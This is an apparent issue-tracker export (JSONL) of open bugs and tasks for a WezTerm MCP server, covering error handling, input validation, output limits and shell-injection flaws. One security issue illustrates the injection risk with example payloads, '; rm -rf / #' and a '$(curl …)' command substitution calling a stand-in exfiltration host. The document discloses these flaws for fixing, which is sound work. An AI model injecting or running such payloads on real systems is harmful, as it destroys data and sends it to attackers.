{"id":"wezterm-mcp-g8f","title":"Standardize MCP error responses (set isError, avoid throwing)","description":"Error handling is inconsistent: most methods return content with text, but send_control_character throws, and none set isError. This makes it hard for clients to reliably detect failures. See src/wezterm_executor.ts:33, src/wezterm_output_reader.ts:36, src/send_control_character.ts:42.","acceptance_criteria":"- Return structured error responses with isError: true for all tool failures.\n- Avoid throwing in tool handlers for expected failures.\n- Update tests to assert error payload shape.","status":"open","priority":2,"issue_type":"task","owner":"davidcforbes@aol.com","created_at":"2026-01-11T19:19:07.652272-08:00","created_by":"davidcforbes","updated_at":"2026-01-11T19:19:07.652272-08:00"}
{"id":"wezterm-mcp-m21","title":"Add runtime validation for MCP tool arguments","description":"Tool handlers assume request.params.arguments and field types always exist. Missing or wrong-typed inputs can throw (e.g., .replace or .toLowerCase() on undefined). Examples: src/index.ts:125 and src/send_control_character.ts:27.","acceptance_criteria":"- Validate presence and types of all tool arguments before use.\n- Return a clear, structured error for invalid inputs instead of throwing.\n- Add tests for missing/invalid argument cases (empty strings, wrong types, omitted fields).","status":"open","priority":1,"issue_type":"bug","owner":"davidcforbes@aol.com","created_at":"2026-01-11T19:19:04.8698784-08:00","created_by":"davidcforbes","updated_at":"2026-01-11T19:19:04.8698784-08:00"}
{"id":"wezterm-mcp-pab","title":"Prevent shell injection via pane_id in wezterm CLI commands","description":"`pane_id` is interpolated into a shell command string passed to `exec`, so a malicious or malformed value can inject arbitrary shell tokens. This affects at least:\n- src/wezterm_executor.ts:52 in writeToSpecificPane\n- src/wezterm_executor.ts:103 in switchPane\n\nBecause MCP tool arguments are user-controlled, this is a security risk when running the server on developer machines.","acceptance_criteria":"- Validate pane_id as a strict integer before invoking any command.\n- Use execFile/spawn with argument arrays instead of shell-constructed strings.\n- Add or update tests to cover rejection of non-numeric pane_id values.\n- Keep error responses structured and user-friendly.","status":"open","priority":0,"issue_type":"bug","owner":"davidcforbes@aol.com","created_at":"2026-01-11T19:19:04.0992733-08:00","created_by":"davidcforbes","updated_at":"2026-01-11T19:19:04.0992733-08:00"}
{"id":"wezterm-mcp-vth","title":"Cap terminal output size and set exec limits","description":"read_terminal_output can request full scrollback (lines \u003c= 0) and uses exec without timeout or buffer limits. Large outputs can hit maxBuffer or hang the MCP server. See src/wezterm_output_reader.ts:17.","acceptance_criteria":"- Introduce a reasonable maximum line cap or explicit read_all flag.\n- Add timeout and maxBuffer safeguards (or switch to streaming).\n- Document behavior when requested lines exceed the cap.","status":"open","priority":1,"issue_type":"bug","owner":"davidcforbes@aol.com","created_at":"2026-01-11T19:19:06.7430869-08:00","created_by":"davidcforbes","updated_at":"2026-01-11T19:19:06.7430869-08:00"}
{"id":"wezterm-mcp-yvn","title":"Critical: Command injection vulnerability in command escaping","description":"**Severity**: Critical\n**Category**: Security\n\n**Description**:\nThe command escaping in wezterm_executor.ts (lines 20, 51) uses an insufficient escape pattern that only handles single quotes:\n```typescript\nconst escapedCommand = command.replace(/'/g, \"'\\\"'\\\"'\");\n```\n\nThis does NOT protect against shell injection via:\n- Backticks: `malicious command`\n- Command substitution: $(malicious command)\n- Pipes and redirects: | \u003e \u003e\u003e \u003c \n- Command chaining: ; \u0026\u0026 ||\n- Glob patterns: * ? [ ]\n\n**Impact**:\nAn attacker could execute arbitrary commands by crafting malicious input like:\n```\n; rm -rf / #\n$(curl malicious-site.com/steal-data)\n```\n\n**Location**: src/wezterm_executor.ts:20, 51\n\n**Recommendation**:\n1. Use proper shell escaping libraries (e.g., shell-escape npm package)\n2. Validate and sanitize input\n3. Use array-based command execution instead of shell strings\n4. Implement a whitelist of allowed characters","status":"open","priority":0,"issue_type":"bug","owner":"davidcforbes@aol.com","created_at":"2026-01-11T19:19:50.0586796-08:00","created_by":"davidcforbes","updated_at":"2026-01-11T19:19:50.0586796-08:00","labels":["critical","security"]}
{"id":"wezterm-mcp-yyx","title":"Make send_control_character cross-platform (avoid $'...')","description":"send_control_character uses bash-only $'\\xNN' quoting via exec, which fails on Windows and on POSIX shells that are not bash. See src/send_control_character.ts:32.","acceptance_criteria":"- Replace $'...' usage with a cross-platform approach (prefer execFile with args).\n- Ensure control sequences are passed correctly to wezterm cli send-text on Windows, macOS, and Linux.\n- Update tests to verify the new invocation format.","status":"open","priority":1,"issue_type":"bug","owner":"davidcforbes@aol.com","created_at":"2026-01-11T19:19:05.6667661-08:00","created_by":"davidcforbes","updated_at":"2026-01-11T19:19:05.6667661-08:00"}
{"id":"wezterm-mcp-zs5","title":"Avoid unnecessary pane listing in write_to_terminal","description":"write_to_terminal always runs wezterm cli list and returns pane info, adding latency and noisy output even when callers only want to send text. See src/wezterm_executor.ts:15.","acceptance_criteria":"- Remove pane listing from the default flow, or gate it behind an optional flag.\n- Keep the response concise by default (just confirmation).\n- Update documentation/tests accordingly.","status":"open","priority":3,"issue_type":"task","owner":"davidcforbes@aol.com","created_at":"2026-01-11T19:19:08.7341555-08:00","created_by":"davidcforbes","updated_at":"2026-01-11T19:19:08.7341555-08:00"}
